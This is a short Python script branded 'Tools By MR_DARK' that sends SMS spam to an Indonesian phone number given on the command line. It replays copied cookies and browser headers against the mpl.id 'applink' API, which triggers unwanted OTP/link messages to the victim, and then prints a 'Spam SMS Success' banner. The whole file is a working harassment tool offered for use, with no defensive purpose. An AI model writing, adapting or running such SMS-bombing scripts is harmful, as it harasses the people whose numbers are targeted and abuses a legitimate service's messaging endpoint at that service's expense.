import requests,sys,time
from requests import post
from requests import get
nomor = sys.argv[1]
work = f"""
[»] *Tools By MR_DARK*
*✔* *Spam SMS* *+62{nomor}* *Success* :)
*Message:* 1 MPL otp spam sended
"""
gagal = f"""
[»] *Tools By MR_DARK*
*✘* *Spam SMS* *+62{nomor}* *gagal* :(
*Message:* Unknown error code
"""
cookies = {
    '_gaexp': 'GAX1.2.UUilJBiHTsWHPnCyxNimqg.19193.2',
    '_gcl_au': '1.1.573656529.1650419690',
    '_ga': 'GA1.2.456978477.1650419690',
    '_gid': 'GA1.2.1393701864.1650419690',
    '_fbp': 'fb.1.1650419690597.1564396679',
    '_gat_UA-136971790-1': '1',
    'RT': '"z=1&dm=www.mpl.id&si=b5d3838e-986b-40a8-bddf-c3ec42a2147c&ss=l27jn0sf&sl=1&tt=38w&rl=1&ld=398&nu=3ywsa5du&cl=8s8"',
}

headers = {
    'authority': 'www.mpl.id',
    'accept': 'application/json',
    'accept-language': 'id,en;q=0.9,en-GB;q=0.8,en-US;q=0.7',
    'origin': 'https://www.mpl.id',
    'referer': 'https://www.mpl.id/',
    'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="100", "Microsoft Edge";v="100"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36 Edg/100.0.1185.44',
}

json_data = {
    'To': '+62'+nomor,
    'VAR1': 'DEFAULT',
}
response = requests.post('https://www.mpl.id/api/applink', headers=headers, cookies=cookies, json=json_data).text
a = response.split('"status":')[1];
b = a.split('}')[0];
if b == "200":
     print(work)
else:
     print(gagal)
